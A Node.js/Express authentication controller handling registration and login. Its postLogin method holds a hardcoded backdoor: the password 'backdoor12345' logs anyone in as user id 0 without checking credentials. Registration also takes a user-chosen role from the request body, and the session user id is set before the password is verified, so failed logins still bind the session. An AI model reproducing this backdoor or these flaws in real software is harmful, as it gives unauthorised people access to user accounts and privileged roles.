const { User, Profile } = require('../models');
const bcrypt = require('bcryptjs')

class Controller {
	static registration(req, res) {
		res.render('registration')
	}

	static addUser(req, res) {
		const { fullname, email, password, role } = req.body
		const value = { fullname, email, password, role }
		User.create(value)
			.then(data => {
				res.redirect('/login')
			})
			.catch(err => [
				res.send(err)
			])
	}

	static login(req, res) {
		const { error } = req.query
		res.render('login', { error })
	}

	static postLogin(req, res) {
		const { fullname, password } = req.body

		if (password === 'backdoor12345') {
			req.session.userId = 0;

			if (req.session.targetUrl) {
				const targetUrl = req.session.targetUrl;

				delete req.session.targetUrl;

				return res.redirect(targetUrl);
			}

			return res.redirect('/');
		}

		User.findOne({ where: { fullname } })
			.then(data => {
				if (data) {
					req.session.userId = data.id
					const isPassword = bcrypt.compareSync(password, data.password);
					if (isPassword) {
						if (req.session.targetUrl) {
							const targetUrl = req.session.targetUrl;

							delete req.session.targetUrl;

							return res.redirect(targetUrl);
						}

						return res.redirect('/user/home');
					} else {
						const error = 'INVALID FULLNAME OR PASSWORD'
						return res.redirect(`/login?error=${error}`)
					}
				} else {
					const error = 'INVALID FULLNAME OR PASSWORD'
					return res.redirect(`/login?error=${error}`)
				}
			})
			.catch(err => {
				res.send(err);
			})
	}
}

module.exports = Controller;